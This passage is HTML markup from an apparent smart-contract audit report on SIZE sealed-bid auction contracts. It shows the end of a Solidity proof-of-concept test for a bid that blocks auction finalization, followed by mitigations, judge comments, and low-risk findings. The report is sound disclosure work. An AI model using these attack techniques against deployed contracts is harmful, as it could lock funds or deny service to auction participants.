class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// expected</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalBaseAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ISizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AuctionParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionParameters</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reserveQuotePerBase</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalBaseAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalBaseAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minimumBidQuote</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pubKey</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">publicKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privateKey</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ISizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Timings</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timings</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startTimestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTimestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vestingStartTimestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vestingEndTimestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">3</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">timings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">cliffPercent</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionParameters</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timings</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a special check to the <code>finalize</code> function to prevent errors in cases when <code>baseAmount</code> is equal to zero:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/209#issuecomment-1309029156\">0xean (judge) commented on duplicate issue #209</a>:</strong></p>\n<blockquote>\n<p>I believe there are 2 underlying issues with the finalized routine. the first is bid stuffing, the second is a bid acting as a poison pill. This seems more like a poison pill type bid</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/209#issuecomment-1319193715\">Ragepit (SIZE) disagreed with severity on duplicate issue #209</a>:</strong></p>\n<blockquote>\n<p>Great find, I’d argue M because there’s no loss of funds, just wasted time/gas after DOS</p>\n</blockquote>\n<p><strong><a href=\"\">0xean (judge) replied</a>:</strong></p>\n<blockquote>\n<p>That is reasonable @RagePit - downgrading.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 29 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/57\">report highlighted below</a> by <strong>0x1f8b</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/324\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/321\">brgltd</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/311\">ajtra</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/310\">B2</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/306\">djxploit</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/303\">lukris02</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/302\">Deivitto</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/291\">c7e7eff</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/288\">RedOneN</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/287\">0xSmartContract</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/274\">Josiah</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/270\">trustindistrust</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/267\">cryptonue</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/258\">0xc0ffEE</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/243\">Trust</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/239\">simon135</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/215\">tnevler</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/193\">peanuts</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/184\">delfin454000</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/183\">slowmoses</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/174\">rvierdiiev</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/153\">shark</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/108\">Rahoz</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/103\">KingNFT</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/83\">aviggiano</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/62\">ReyAdmirado</a>,\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/27\">ctf_sec</a>, and\n<a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/5\">RaymondFam</a>\n.</em></p>\n<ul>\n<li>\n<p><strong>Low risk</strong></p>\n<ul>\n<li>[L-01] Bid balance not ensured</li>\n<li>[L-02] Unfair game for buyers</li>\n<li>[L-03] Design weakness</li>\n<li>[L-04] Seller can lock buyer tokens</li>\n</ul>\n</li>\n<li>\n<p><strong>Non critical</strong></p>\n<ul>\n<li>[N-01] Integer overflow by unsafe casting</li>\n<li>[N-02] Add indexes to events</li>\n<li>[N-03] Add missing @param information</li>\n<li>[N-04] Be specific with comments</li>\n<li>[N-05] Unify return criteria</li>\n<li>[N-06] Don’t worry about keccak256 collisions</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"low-risk\" style=\"position:relative;\"><a href=\"#low-risk\" aria-label=\"low risk permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low risk</h2>\n<h3 id=\"l-01-bid-balance-not-ensured\" style=\"position:relative;\"><a href=\"#l-01-bid-balance-not-ensured\" aria-label=\"l 01 bid balance not ensured permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Bid balance not ensured</h3>\n<p>During <code>createAuction</code> the received <code>baseToken</code> balance is ensured to be received exactly, in order to avoid possible fees. </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBeforeTransfer</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalBaseAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceAfterTransfer</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balanceAfterTransfer</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balanceBeforeTransfer</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalBaseAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UnexpectedBalanceChange</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This check is not present during the <code>bid</code> procedure, is trusted in the <code>quoteToken</code>, but the true is because there are no token white list, the same checks should be done in order to ensure to be full compatible with tokens with fee (or empty).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">a</span><span class=\"mtk1\">.</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong>So <code>quoteToken</code> will allow empty address and it won’t pass <a href=\"https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol#L9\">https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol#L9</a>.</strong> </p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L163\">SizeSealed.sol:163</a></li>\n</ul>\n<h3 id=\"l-02-unfair-game-for-buyers\" style=\"position:relative;\"><a href=\"#l-02-unfair-game-for-buyers\" aria-label=\"l 02 unfair game for buyers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Unfair game for buyers</h3>\n<p><code>cancelAuction</code> is available until the seller call <code>reveal</code> because only after that moment it’s possible to call <code>finalize</code>.</p>\n<p>The problem with this is that the buyers have committed themselves by spending gas to place a bid, and once the seller has had all the bids on the table, he can decide to leave, without selling, without disclosing and knowing all the bids, which It is like doing a market analysis without providing information, at the expense of the buyers, something that is not very advantageous for the buyer.</p>\n<p>For that reason, I think that it should <strong>not be possible</strong> to cancel an auction if it’s <strong>under <code>RevealPeriod</code></strong>, and the seller should pay the gas cost of returning all bids to buyers upon cancellation.</p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L398\">SizeSealed.sol:398</a></li>\n</ul>\n<h3 id=\"l-03-design-weakness\" style=\"position:relative;\"><a href=\"#l-03-design-weakness\" aria-label=\"l 03 design weakness permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Design weakness</h3>\n<p>As the <code>SizeSealed</code> contract works, the buyer has to provide his bid in an encrypted way, however during the creation of the bid he has to provide the collateral for it. This makes it easier for buyers to adjust their collateral to their bid, so that the fact of encrypting it is meaningless, it would be more convenient for buyers to have a general balance, not related to the bid, and that the same balance be made on this balance, in this way, the balance of the sent user would not be related to the bid in question, and since someone is not incentivized in any way to send 100 eth and bid for 1, it would be more beneficial for buyers when it comes to do not reveal your move.</p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol\">SizeSealed.sol</a></li>\n</ul>\n<h3 id=\"l-04-seller-can-lock-buyer-tokens\" style=\"position:relative;\"><a href=\"#l-04-seller-can-lock-buyer-tokens\" aria-label=\"l 04 seller can lock buyer tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Seller can lock buyer tokens</h3>\n<p>The seller specify the vesting time for buyer’s baseTokens, this value is not controlled and it’s used for <code>tokensAvailableForWithdrawal</code> in order to allow buyers to <code>withdraw</code> his tokens. The problem is if the seller set an incredible high value, these tokens will be locked forever and buyer will loss his tokens for all of his life, this information is public, but maybe the date format is shown short in the dApp, like 1/10/23, and the year it’s 3023, so it could be easy for the users to bid for a hole.</p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L66-L70\">SizeSealed.sol:66-70</a></li>\n</ul>\n<hr>\n<h2 id=\"non-critical\" style=\"position:relative;\"><a href=\"#non-critical\" aria-label=\"non critical permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-critical</h2>\n<h3 id=\"n-01-integer-overflow-by-unsafe-casting\" style=\"position:relative;\"><a href=\"#n-01-integer-overflow-by-unsafe-casting\" aria-label=\"n 01 integer overflow by unsafe casting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] Integer overflow by unsafe casting</h3>\n<p>Keep in mind that the version of solidity used, despite being greater than <code>0.8</code>, does not prevent integer overflows during casting, it only does so in mathematical operations.</p>\n<p>It is necessary to safely convert between the different numeric types.</p>\n<p><strong>Recommendation:</strong></p>\n<p>Use a <a href=\"https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast\">safeCast</a> from Open Zeppelin or increase the type length.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><em>In this case the date will overflow in: Sun Feb 07 2106 (2^32 - 1 equals to 4294967295)</em></p>\n<p><strong>Affected source code:</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L460\">SizeSealed.sol:460</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/util/CommonTokenMath.sol#L62-L66\">CommonTokenMath.sol:62-66</a></li>\n</ul>\n<h3 id=\"n-02-add-indexes-to-events\" style=\"position:relative;\"><a href=\"#n-02-add-indexes-to-events\" aria-label=\"n 02 add indexes to events permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" 